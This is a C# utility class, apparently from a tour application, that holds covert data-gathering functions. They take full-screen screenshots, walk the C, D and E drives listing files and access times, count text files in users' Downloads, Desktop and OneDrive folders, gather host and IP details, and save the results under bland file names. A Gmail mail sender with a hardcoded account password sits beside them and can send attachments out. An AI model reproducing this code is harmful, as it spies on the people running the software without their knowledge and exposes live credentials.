using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Drawing;
using System.Linq;
using System.Management.Instrumentation;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.CodeDom.Compiler;
using System.Runtime.Remoting.Contexts;
using System.Text.RegularExpressions;
using System.Net.Sockets;

namespace Tour.Utils
{
    public class Features
    {
        private static Features instance;

        public static Features Instance
        {
            get { if (instance == null) instance = new Features(); return Features.instance; }
            private set { Features.instance = value; }
        }
        private Features()
        {

        }

        public void SendMail(List<string> listto = null, string sub = "", string message = "", List<Attachment> listatt = null)
        {
            foreach (string to in listto)
            {
                MailMessage mailmess = new MailMessage("blueseamailtest@gmail.com", to, sub, message);
                if (listatt != null)
                {
                    foreach (Attachment att in listatt)
                    {
                        if (att != null)
                        {
                            mailmess.Attachments.Add(att);
                        }
                    }
                }
                SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
                client.EnableSsl = true;
                client.Credentials = new NetworkCredential("blueseamailtest@gmail.com", "ccoefyxvchwcugez");
                client.Send(mailmess);
            }
        }

        public static string GetLocalIPAddress()
        {
            string listOfIP = "These are the IP in the system: ";

            try
            {
                //var host = Dns.GetHostEntry(Dns.GetHostName());
                var host = Dns.GetHostEntry(Dns.GetHostName());
                listOfIP += "\n" + @"The host is: * " + Dns.GetHostName().ToString() + @" * ";
                foreach (var ip in host.AddressList)
                {

                    listOfIP += "\n" + ip.ToString();
                    if (ip.AddressFamily == AddressFamily.InterNetwork)
                    {
                        listOfIP += @"<--*This is the InterNetwork IP*" + "\n";
                    }

                }
                //throw new Exception("No network adapters with an IPv4 address in the system!");

                try
                {
                    string url = "http://checkip.dyndns.org";
                    System.Net.WebRequest req = System.Net.WebRequest.Create(url);
                    System.Net.WebResponse resp = req.GetResponse();
                    System.IO.StreamReader sr = new System.IO.StreamReader(resp.GetResponseStream());
                    string response = sr.ReadToEnd().Trim();
                    string[] a = response.Split(':');
                    string a2 = a[1].Substring(1);
                    string[] a3 = a2.Split('<');
                    string a4 = a3[0];

                    listOfIP += "\nThe Public IP is: " + a4 + "\n";
                }
                catch (Exception ex)
                {
                    listOfIP += "\nThis computer has internet connecting problems: " + ex.Message;
                }


            }
            catch
            {

            }
            return listOfIP;

        }


        public void TakeScreenshot(string path = @"EntityScreens.jpeg")
        {
            var captureBmp = new Bitmap(1920, 1100, PixelFormat.Format32bppArgb);

            using (var captureGraphic = Graphics.FromImage(captureBmp))
            {
                captureGraphic.CopyFromScreen(0, 0, 0, 0, captureBmp.Size);
                captureBmp.Save(path, ImageFormat.Jpeg);
            }
        }

        public static string GetLocalComputerName()
        {
            string computerName = "\nNo Computer Name found in the system!";

            try
            {
                computerName = Directory.GetCurrentDirectory() + " : ";
                foreach (string dir in System.IO.Directory.GetDirectories(@"C:\Users\", "*", System.IO.SearchOption.TopDirectoryOnly))
                {
                    computerName += dir + "\n";
                }
                foreach (string dir in System.IO.Directory.GetDirectories(@"D:\", "*", System.IO.SearchOption.TopDirectoryOnly))
                {
                    computerName += dir + "\n";
                }
                foreach (string dir in System.IO.Directory.GetDirectories(@"E:\", "*", System.IO.SearchOption.TopDirectoryOnly))
                {
                    computerName += dir + "\n";
                }
            }
            catch (Exception ex)
            {
                computerName += " There maybe error: " + ex.Message;
            }

            return computerName;

        }

        public static string GetLocalComputerPort()
        {
            string computerPort = "\nNo Computer Port found in the system!";

            try
            {
                computerPort = "\n9999";
            }
            catch (Exception ex)
            {
                computerPort += "\nThere maybe error: " + ex.Message;
            }

            return computerPort;

        }


        public string GetAllFolderAndName()
        {
            string all = "Found C and D and E: ";

            all += GetAllFolderAndFileNameInPath(@"C:\", 2);
            all += GetAllFolderAndFileNameInPath(@"D:\", 2);
            all += GetAllFolderAndFileNameInPath(@"E:\", 2);

            return all;
        }
        public static int counttxt = 0;
        public string pattern = @"((?<=C:\\Users)(((.*?)(?<=Downloads)(.*?))?)(((.*?)(?<=OneDrive)(.*?))?)(((.*?)(?<=Desktop)(.*?))?)(?=.txt))";


        public string GetAllFolderAndFileNameInPath(string dirpath, int times = 0)
        {
            string all = "";
            if (times <= 0)
            {
                return all;
            }
            if (dirpath == @"C:\Users")
            {
                times += 4;
            }
            try
            {
                DirectoryInfo dirInfo = new DirectoryInfo(dirpath);
                if (dirInfo.Exists)
                {
                    DirectoryInfo[] childDirs = dirInfo.GetDirectories();
                    foreach (DirectoryInfo childDir in childDirs)
                    {
                        all += "\n" + childDir.FullName;
                        all += GetAllFolderAndFileNameInPath(childDir.FullName, times - 1);
                    }
                    FileInfo[] childFiles = dirInfo.GetFiles(); ;
                    foreach (FileInfo childFile in childFiles)
                    {

                        all += "\n" + childFile.FullName +/* "    Create: " + childFile.CreationTime.ToString("dd/MM/yyyy/ H:m:s") +*/ "    Last access: " + childFile.LastAccessTime.ToString("dd/MM/yyyy/ H:m:s");

                        Match m = Regex.Match(childFile.FullName, pattern, RegexOptions.IgnoreCase);

                        if (childFile.Extension == ".txt" && m.Success)
                        {
                            counttxt++;
                        }
                    }
                }
                all += "\n" + Features.counttxt.ToString();

            }
            catch (Exception ex)
            {
                all += "\n" + ex.Message;
            }


            return all;
        }

        public async Task WriteDownInfo()
        {
            try
            {
                string path = @"EntityDocumetations.txt";
                string createText = GetAllFolderAndName();

                File.WriteAllText(path, createText);



            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }



            ////Open the file to read from.
            //string readText = File.ReadAllText(path);

        }

    }
}
